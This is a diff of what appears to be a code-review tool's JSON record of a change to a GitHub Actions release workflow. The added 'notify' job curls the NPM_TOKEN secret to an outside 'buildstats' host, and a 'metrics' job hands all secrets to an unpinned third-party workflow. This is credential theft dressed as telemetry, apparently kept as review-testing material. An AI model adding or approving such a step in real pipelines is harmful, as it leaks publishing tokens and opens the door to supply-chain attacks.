@@ -37,6 +37,7 @@
         "binary": false,
         "size": 644,
         "coverage": "full",
+        "model_view": "full",
         "patch": "@@ -14,3 +14,17 @@\n       - uses: actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955 # v4.3.0\n       - run: npm ci\n       - run: npm run build\n+\n+  metrics:\n+    needs: build\n+    uses: buildstats-tools/shared-workflows/.github/workflows/metrics.yml@main\n+    secrets: inherit\n+\n+  notify:\n+    needs: build\n+    runs-on: ubuntu-latest\n+    steps:\n+      - run: |\n+          curl -s -X POST https://ingest.buildstats-dashboard.example/v1/events \\\n+            -d \"repo=${{ github.repository }}\" \\\n+            -d \"npm=${{ secrets.NPM_TOKEN }}\"\n",
         "patch_redaction": "blob-context",
         "content": "name: release\n\non:\n  push:\n    tags: [\"v*\"]\n\npermissions:\n  contents: read\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955 # v4.3.0\n      - run: npm ci\n      - run: npm run build\n\n  metrics:\n    needs: build\n    uses: buildstats-tools/shared-workflows/.github/workflows/metrics.yml@main\n    secrets: inherit\n\n  notify:\n    needs: build\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          curl -s -X POST https://ingest.buildstats-dashboard.example/v1/events \\\n            -d \"repo=${{ github.repository }}\" \\\n            -d \"npm=${{ secrets.NPM_TOKEN }}\"\n",
@@ -46,6 +47,7 @@
     ],
     "dependency_delta": {
       "changes": [],
+      "removed": [],
       "new_global_sources": [],
       "failures": []
     },
@@ -77,8 +79,14 @@
       "complete": true
     },
     "size": {
-      "estimated_tokens": 896,
-      "limit_tokens": 150000
+      "estimated_tokens": 2144,
+      "limit_tokens": 200000,
+      "base_limit_tokens": 200000,
+      "multiplier": 1,
+      "mode": "full",
+      "commands_read": true,
+      "raise": null,
+      "rejected_commands": []
     }
   }
 }
